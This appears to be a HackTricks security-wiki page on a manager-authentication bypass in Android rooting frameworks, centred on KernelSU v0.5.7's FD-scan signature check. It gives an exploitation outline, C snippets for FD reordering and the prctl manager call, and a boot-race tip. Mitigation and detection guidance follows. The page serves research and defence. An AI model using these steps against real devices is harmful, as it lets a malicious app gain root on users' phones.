_body: "# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse\n\n{{#include ../../banners/hacktricks-training.md}}\n\
  \nRooting frameworks like KernelSU, APatch, SKRoot and Magisk frequently patch the Linux/Android kernel and expose privileged\
  \ functionality to an unprivileged userspace \"manager\" app via a hooked syscall. If the manager-authentication step is\
  \ flawed, any local app can reach this channel and escalate privileges on already-rooted devices.\n\nThis page abstracts\
  \ the techniques and pitfalls uncovered in public research (notably Zimperium’s analysis of KernelSU v0.5.7) to help both\
  \ red and blue teams understand attack surfaces, exploitation primitives, and robust mitigations.\n\n---\n## Architecture\
  \ pattern: syscall-hooked manager channel\n\n- Kernel module/patch hooks a syscall (commonly prctl) to receive \"commands\"\
  \ from userspace.\n- Protocol typically is: magic_value, command_id, arg_ptr/len ...\n- A userspace manager app authenticates\
  \ first (e.g., CMD_BECOME_MANAGER). Once the kernel marks the caller as a trusted manager, privileged commands are accepted:\n\
  \  - Grant root to caller (e.g., CMD_GRANT_ROOT)\n  - Manage allowlists/deny-lists for su\n  - Adjust SELinux policy (e.g.,\
  \ CMD_SET_SEPOLICY)\n  - Query version/configuration\n- Because any app can invoke syscalls, the correctness of the manager\
  \ authentication is critical.\n\nExample (KernelSU design):\n- Hooked syscall: prctl\n- Magic value to divert to KernelSU\
  \ handler: 0xDEADBEEF\n- Commands include: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT,\
  \ etc.\n\n---\n## KernelSU v0.5.7 authentication flow (as implemented)\n\nWhen userspace calls prctl(0xDEADBEEF, CMD_BECOME_MANAGER,\
  \ data_dir_path, ...), KernelSU verifies:\n\n1) Path prefix check\n- The provided path must start with an expected prefix\
  \ for the caller UID, e.g. /data/data/<pkg> or /data/user/<id>/<pkg>.\n  - Reference: core_hook.c (v0.5.7) path prefix logic.\n\
  \n2) Ownership check\n- The path must be owned by the caller UID.\n  - Reference: core_hook.c (v0.5.7) ownership logic.\n\
  \n3) APK signature check via FD table scan\n- Iterate the calling process’ open file descriptors (FDs).\n- Pick the first\
  \ file whose path matches /data/app/*/base.apk.\n- Parse APK v2 signature and verify against the official manager certificate.\n\
  \  - References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).\n\nIf all checks pass, the kernel caches the\
  \ manager’s UID temporarily and accepts privileged commands from that UID until reset.\n\n---\n## Vulnerability class: trusting\
  \ “the first matching APK” from FD iteration\n\nIf the signature check binds to \"the first matching /data/app/*/base.apk\"\
  \ found in the process FD table, it is not actually verifying the caller’s own package. An attacker can pre-position a legitimately\
  \ signed APK (the real manager’s) so that it appears earlier in the FD list than their own base.apk.\n\nThis trust-by-indirection\
  \ lets an unprivileged app impersonate the manager without owning the manager’s signing key.\n\nKey properties exploited:\n\
  - The FD scan does not bind to the caller’s package identity; it only pattern-matches path strings.\n- open() returns the\
  \ lowest available FD. By closing lower-numbered FDs first, an attacker can control ordering.\n- The filter only checks\
  \ that the path matches /data/app/*/base.apk – not that it corresponds to the installed package of the caller.\n\n---\n\
  ## Attack preconditions\n\n- The device is already rooted with a vulnerable rooting framework (e.g., KernelSU v0.5.7).\n\
  - The attacker can run arbitrary unprivileged code locally (Android app process).\n- The real manager has not yet authenticated\
  \ (e.g., right after a reboot). Some frameworks cache the manager UID after success; you must win the race.\n\n---\n## Exploitation\
  \ outline (KernelSU v0.5.7)\n\nHigh-level steps:\n1) Build a valid path to your own app data directory to satisfy prefix\
  \ and ownership checks.\n2) Ensure a genuine KernelSU Manager base.apk is opened on a lower-numbered FD than your own base.apk.\n\
  3) Invoke prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) to pass the checks.\n4) Issue privileged commands\
  \ like CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY to persist elevation.\n\nPractical notes on step 2 (FD ordering):\n\
  - Identify your process’ FD for your own /data/app/*/base.apk by walking /proc/self/fd symlinks.\n- Close a low FD (e.g.,\
  \ stdin, fd 0) and open the legitimate manager APK first so it occupies fd 0 (or any index lower than your own base.apk\
  \ fd).\n- Bundle the legitimate manager APK with your app so its path satisfies the kernel’s naive filter. For example,\
  \ place it under a subpath matching /data/app/*/base.apk.\n\nExample code snippets (Android/Linux, illustrative only):\n\
  \nEnumerate open FDs to locate base.apk entries:\n```c\n#include <dirent.h>\n#include <stdio.h>\n#include <unistd.h>\n#include\
  \ <string.h>\n\nint find_first_baseapk_fd(char out_path[PATH_MAX]) {\n    DIR *d = opendir(\"/proc/self/fd\");\n    if (!d)\
  \ return -1;\n    struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];\n    int best_fd = -1;\n    while ((e = readdir(d)))\
  \ {\n        if (e->d_name[0] == '.') continue;\n        int fd = atoi(e->d_name);\n        snprintf(link, sizeof(link),\
  \ \"/proc/self/fd/%d\", fd);\n        ssize_t n = readlink(link, p, sizeof(p)-1);\n        if (n <= 0) continue; p[n] =\
  \ '\\0';\n        if (strstr(p, \"/data/app/\") && strstr(p, \"/base.apk\")) {\n            if (best_fd < 0 || fd < best_fd)\
  \ {\n                best_fd = fd; strncpy(out_path, p, PATH_MAX);\n            }\n        }\n    }\n    closedir(d);\n\
  \    return best_fd; // First (lowest) matching fd\n}\n```\n\nForce a lower-numbered FD to point at the legitimate manager\
  \ APK:\n```c\n#include <fcntl.h>\n#include <unistd.h>\n\nvoid preopen_legit_manager_lowfd(const char *legit_apk_path) {\n\
  \    // Reuse stdin (fd 0) if possible so the next open() returns 0\n    close(0);\n    int fd = open(legit_apk_path, O_RDONLY);\n\
  \    (void)fd; // fd should now be 0 if available\n}\n```\n\nManager authentication via prctl hook:\n```c\n#include <sys/prctl.h>\n\
  #include <stdint.h>\n\n#define KSU_MAGIC          0xDEADBEEF\n#define CMD_BECOME_MANAGER 0x100  // Placeholder; command\
  \ IDs are framework-specific\n\nstatic inline long ksu_call(unsigned long cmd, unsigned long arg2,\n                   \
  \         unsigned long arg3, unsigned long arg4) {\n    return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);\n}\n\nint become_manager(const\
  \ char *my_data_dir) {\n    long result = -1;\n    // arg2: command, arg3: pointer to data path (userspace->kernel copy),\
  \ arg4: optional result ptr\n    result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);\n    return (int)result;\n\
  }\n```\n\nAfter success, privileged commands (examples):\n- CMD_GRANT_ROOT: promote current process to root\n- CMD_ALLOW_SU:\
  \ add your package/UID to allowlist for persistent su\n- CMD_SET_SEPOLICY: adjust SELinux policy as supported by framework\n\
  \nRace/persistence tip:\n- Register a BOOT_COMPLETED receiver in AndroidManifest (RECEIVE_BOOT_COMPLETED) to start early\
  \ after reboot and attempt authentication before the real manager.\n\n---\n## Detection and mitigation guidance\n\nFor framework\
  \ developers:\n- Bind authentication to the caller’s package/UID, not to arbitrary FDs:\n  - Resolve the caller’s package\
  \ from its UID and verify against the installed package’s signature (via PackageManager) rather than scanning FDs.\n  -\
  \ If kernel-only, use stable caller identity (task creds) and validate on a stable source of truth managed by init/userspace\
  \ helper, not process FDs.\n- Avoid path-prefix checks as identity; they are trivially satisfiable by the caller.\n- Use\
  \ nonce-based challenge–response over the channel and clear any cached manager identity at boot or on key events.\n- Consider\
  \ binder-based authenticated IPC instead of overloading generic syscalls when feasible.\n\nFor defenders/blue team:\n- Detect\
  \ presence of rooting frameworks and manager processes; monitor for prctl calls with suspicious magic constants (e.g., 0xDEADBEEF)\
  \ if you have kernel telemetry.\n- On managed fleets, block or alert on boot receivers from untrusted packages that rapidly\
  \ attempt privileged manager commands post-boot.\n- Ensure devices are updated to patched framework versions; invalidate\
  \ cached manager IDs on update.\n\nLimitations of the attack:\n- Only affects devices already rooted with a vulnerable framework.\n\
  - Typically requires a reboot/race window before the legitimate manager authenticates (some frameworks cache manager UID\
  \ until reset).\n\n---\n## Related notes across frameworks\n\n- Password-based auth (e.g., historical APatch/SKRoot builds)\
  \ can be weak if passwords are guessable/bruteforceable or validations are buggy.\n- Package/signature-based auth (e.g.,\
  \ KernelSU) is stronger in principle but must bind to the actual caller, not indirect artefacts like FD scans.\n- Magisk:\
  \ CVE-2024-48336 (MagiskEoP) showed that even mature ecosystems can be susceptible to identity spoofing leading to code\
  \ execution with root inside manager context.\n\n---\n## References\n\n- [Zimperium – The Rooting of All Evil: Security\
